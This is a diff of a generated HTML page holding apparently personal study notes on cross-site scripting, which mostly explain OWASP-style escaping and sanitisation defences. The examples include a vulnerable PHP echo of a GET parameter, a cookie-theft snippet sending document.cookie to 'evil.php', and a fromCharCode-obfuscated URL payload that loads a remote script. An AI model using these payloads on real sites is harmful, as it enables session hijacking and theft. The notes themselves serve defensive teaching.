@@ -553,21 +553,19 @@ window.addEventListener("load", function(){
 <p>The attacker inject the code into the pages that victim downloads from the website. Example if the <strong>user input is directly included</strong> in the output.</p>
 
 <p>Example: (SSI)</p>
-<div class="language-html highlighter-rouge"><pre class="highlight"><code>print "<span class="nt">&lt;html&gt;</span>"
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print "<span class="nt">&lt;html&gt;</span>"
 print "Latest comment:"
 print database.latestComment
 print "<span class="nt">&lt;/html&gt;</span>"
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>If user supply “<code class="highlighter-rouge">&lt;script&gt;...&lt;/script&gt;</code>” as a comment (under a post i.e) the output will be:</p>
 
-<div class="language-html highlighter-rouge"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
 Latest comment:
 <span class="nt">&lt;script&gt;</span><span class="p">...</span><span class="nt">&lt;/script&gt;</span>
 <span class="nt">&lt;/html&gt;</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>and will be executed in the browser victim.</p>
 
@@ -577,11 +575,10 @@ Latest comment:
 
 <p>This is a server side PHP script</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
 <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
 <span class="cp">?&gt;</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>if a client requests “<code class="highlighter-rouge">http://example.com?id=&lt;script&gt;alert("hello");&lt;/script&gt;</code>”
 the output will be .. ?</p>
@@ -663,11 +660,10 @@ CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg"
 
 <p>cookie theft</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;SCRIPT type="text/javascript"&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;SCRIPT type="text/javascript"&gt;
 var adr = '../evil.php?cakemonster=' + escape(document.cookie);
 &lt;/SCRIPT&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="how-to-contrast-xss">How to contrast XSS</h3>
 <p>XSS is a type of <strong>code injection</strong> –&gt; input must be secured.
@@ -743,10 +739,9 @@ You MUST use the escape syntax for the part of the HTML document you’re puttin
 
 <p>JavaScript encodeURIComponent():</p>
 
-<div class="language-javascript highlighter-rouge"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">uri</span> <span class="o">=</span> <span class="s2">"https://w3schools.com/my test.asp?name=ståle&amp;car=saab"</span><span class="p">;</span>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">uri</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://w3schools.com/my test.asp?name=ståle&amp;car=saab</span><span class="dl">"</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">uri</span><span class="p">);</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>results in:</p>
 
 <p><code class="highlighter-rouge">https%3A%2F%2Fw3schools.com%2Fmy%20test.asp%3Fname%3Dst%C3%A5le%26car%3Dsaab</code></p>
@@ -766,7 +761,7 @@ You MUST use the escape syntax for the part of the HTML document you’re puttin
 
 <p>Example:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://browservictim.com/page.html?id=1');eval(String.fromCharCode(115,
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://browservictim.com/page.html?id=1');eval(String.fromCharCode(115,
 61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,10
 9,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61
 ,39,104,116,116,112,58,47,47,98,114,111,119,115,101,114,104,97,99,107,10
@@ -774,8 +769,7 @@ You MUST use the escape syntax for the part of the HTML document you’re puttin
 09,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,9
 7,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,10
 1,110,100,67,104,105,108,100,40,115,41,59))//
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>will be interpreted in</p>
 
@@ -791,41 +785,37 @@ You MUST use the escape syntax for the part of the HTML document you’re puttin
   <li><strong>Never Insert Untrusted Data Except in Allowed Locations</strong>: deny all, don’t put untrusted data into HTML document/tag  and nested contexts. Example:</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;script&gt;...NEVER PUT UNTRUSTED DATA HERE...&lt;/script&gt;   directly in a script
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;...NEVER PUT UNTRUSTED DATA HERE...&lt;/script&gt;   directly in a script
 &lt;!--...NEVER PUT UNTRUSTED DATA HERE...--&gt;             inside an HTML comment
 &lt;div ...NEVER PUT UNTRUSTED DATA HERE...=test /&gt;       in an attribute name
 &lt;NEVER PUT UNTRUSTED DATA HERE... href="/test" /&gt;   in a tag name
 &lt;style&gt;...NEVER PUT UNTRUSTED DATA HERE...&lt;/style&gt;   directly in CSS
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <ul>
   <li><strong>HTML Escape Before Inserting Untrusted Data into HTML Element Content</strong></li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;body&gt;...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&lt;/body&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;body&gt;...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&lt;/body&gt;
 &lt;div&gt;...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&lt;/div&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Escape the following characters with HTML entity encoding:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&amp; --&gt; &amp;amp;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp; --&gt; &amp;amp;
 &lt; --&gt; &amp;lt;
 &gt; --&gt; &amp;gt;
 " --&gt; &amp;quot;
 ' --&gt; &amp;#x27;
 / --&gt; &amp;#x2F;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <ul>
   <li><strong>Attribute Escape Before Inserting Untrusted Data into HTML Common Attributes</strong>:is for putting untrusted data into typical attribute values like width, name, value, etc</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;div attr="...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."&gt;content&lt;/div&gt;   inside double quoted attribute
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div attr="...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."&gt;content&lt;/div&gt;   inside double quoted attribute
+</code></pre></div></div>
 
 <p>Escape all characters with ASCII values less than 256 with the &amp;#xHH; format</p>
 
@@ -833,42 +823,37 @@ You MUST use the escape syntax for the part of the HTML document you’re puttin
   <li><strong>JavaScript Escape Before Inserting Untrusted Data into JavaScript Data Values</strong>: for dynamically generated JavaScript code</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;script&gt;x='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'&lt;/script&gt;          one side of a quoted expression
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;x='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'&lt;/script&gt;          one side of a quoted expression
 &lt;div onmouseover="x='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'"&lt;/div&gt;  inside quoted event handler
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Some JavaScript functions can never safely use untrusted data as input - EVEN IF JAVASCRIPT ESCAPED!</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;script&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
 window.setInterval('...EVEN IF YOU ESCAPE UNTRUSTED DATA YOU ARE XSSED HERE...');
  &lt;/script&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <ul>
   <li><strong>CSS Escape And Strictly Validate Before Inserting Untrusted Data into HTML Style Property Values</strong>: You should stay away from putting untrusted data into complex properties like url, behavior, and custom (-moz-binding)</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;style&gt;selector { property : "...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."; } &lt;/style&gt;   property value
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;style&gt;selector { property : "...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."; } &lt;/style&gt;   property value
 &lt;span style="property : ...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."&gt;text&lt;/span&gt;       property value
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Example:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w"> </span><span class="err">background-url</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="nt">"javascript:alert(1)"</span><span class="err">;</span><span class="w"> </span><span class="err">}</span><span class="w">  </span><span class="err">//</span><span class="w"> </span><span class="err">and</span><span class="w"> </span><span class="err">all</span><span class="w"> </span><span class="err">other</span><span class="w"> </span><span class="err">URLs</span><span class="w">
-</span><span class="p">{</span><span class="w"> </span><span class="err">text-size:</span><span class="w"> </span><span class="nt">"expression(alert('XSS'))"</span><span class="err">;</span><span class="w"> </span><span class="err">}</span><span class="w">   </span><span class="err">//</span><span class="w"> </span><span class="err">only</span><span class="w"> </span><span class="err">in</span><span class="w"> </span><span class="err">IE</span><span class="w">
-</span></code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{ background-url : "javascript:alert(1)"; }  // and all other URLs
+{ text-size: "expression(alert('XSS'))"; }   // only in IE
+</code></pre></div></div>
 
 <ul>
   <li><strong>URL Escape Before Inserting Untrusted Data into HTML URL Parameter Values</strong>:when you want to put untrusted data into HTTP GET parameter value.</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;a href="http://www.somesite.com?test=...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."&gt;link&lt;/a &gt;       
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="http://www.somesite.com?test=...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."&gt;link&lt;/a &gt;       
+</code></pre></div></div>
 
 <ul>
   <li><strong>Sanitize HTML Markup with a Library Designed for the Job</strong>: like <em><a href="https://github.com/mganss/HtmlSanitizer">HtmlSanitizer</a></em> or <em><a href="https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project">OWASP Java HTML Sanitizer</a></em> or <em><a href="http://htmlpurifier.org/">PHP HTML Purifier</a></em> or others.</li>
@@ -931,6 +916,28 @@ var sanitized = sanitizer.Sanitize(html);
 </article>
 <hr />
 
+
+    
+    
+        
+            
+        
+    
+        
+            
+        
+    
+
+    
+    
+        
+            
+        
+    
+        
+            
+        
+    
 
     
     
